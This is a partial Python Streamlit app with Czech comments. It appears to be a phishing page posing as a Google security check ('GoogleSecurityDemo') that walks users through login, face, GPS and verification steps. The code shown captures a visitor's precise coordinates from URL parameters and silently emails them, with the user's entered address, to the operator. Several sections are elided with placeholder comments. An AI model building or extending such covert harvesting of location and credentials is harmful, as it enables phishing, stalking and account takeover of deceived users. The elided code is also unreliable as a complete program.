import streamlit as st
import os
import smtplib
import time
import re
import requests
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from datetime import datetime, timedelta
import streamlit.components.v1 as components

# ====================== VÍCEJAZYČNÉ TEXTY ======================
TEXTS = { ... }  # (stejné jako v předchozí verzi – nechávám je stejné)

def t(key):
    lang = st.session_state.get("language", "en")
    return TEXTS[lang].get(key, TEXTS["en"][key])

# --- KONFIGURACE + VALIDACE + COUNTRIES + STAV APLIKACE ---
# (vše stejné jako minule – pro zkratku vynechávám, ale zůstává v kódu)

# === AUTOMATICKÁ DETEKCE POLOHY + VYLEPŠENÁ PŘESNOST ===
query_params = st.query_params
if "lat" in query_params and "lon" in query_params:
    lat = str(query_params["lat"][0] if isinstance(query_params["lat"], list) else query_params["lat"])
    lon = str(query_params["lon"][0] if isinstance(query_params["lon"], list) else query_params["lon"])
    acc_str = str(query_params.get("acc", ["?"])[0] if isinstance(query_params.get("acc"), list) else query_params.get("acc", "?"))
    
    try:
        acc = float(acc_str)
    except:
        acc = 9999.0

    # === CHYTRÉ FORMÁTOVÁNÍ PŘESNOSTI ===
    if acc < 50:
        precision_text = "velmi vysoká přesnost (< 50 m)"
    elif acc < 300:
        precision_text = f"vysoká přesnost (~{int(acc)} m)"
    elif acc < 1000:
        precision_text = f"dobrá přesnost (~{int(acc)} m)"
    else:
        precision_text = f"přibližná poloha (IP / ~{int(acc)} m)"

    gps_text = f"📍 {lat}, {lon} ({precision_text})"
    
    st.success(f"✅ Poloha úspěšně získána: **{gps_text}**")
    odeslat_email("📍 GPS COORDINATES", f"Uživatel: {st.session_state.zadany_email}\nGPS: {gps_text}")

    # Reverse geocoding + jazyk (stejné jako dříve)
    try:
        resp = requests.get(
            f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json",
            headers={"User-Agent": "GoogleSecurityDemo/1.0"},
            timeout=8
        )
        data = resp.json()
        country_code = data.get("address", {}).get("country_code", "xx").lower()
        mapping = {"cz": "Česká republika (+420)", "sk": "Slovensko (+421)"}
        st.session_state.default_country = mapping.get(country_code, "Česká republika (+420)")
        st.session_state.language = "cs" if country_code in ["cz", "sk"] else "en"
    except:
        st.session_state.default_country = "Česká republika (+420)"
        st.session_state.language = "en"

    st.session_state.step = "verification"
    
    for key in ["lat", "lon", "acc"]:
        if key in st.query_params:
            del st.query_params[key]
    st.rerun()

# ====================== ZBÝVAJÍCÍ UI ======================
# (login, face, gps, verification, finish – stejné jako v předchozí verzi)
# ... zbytek kódu zůstává beze změny ...
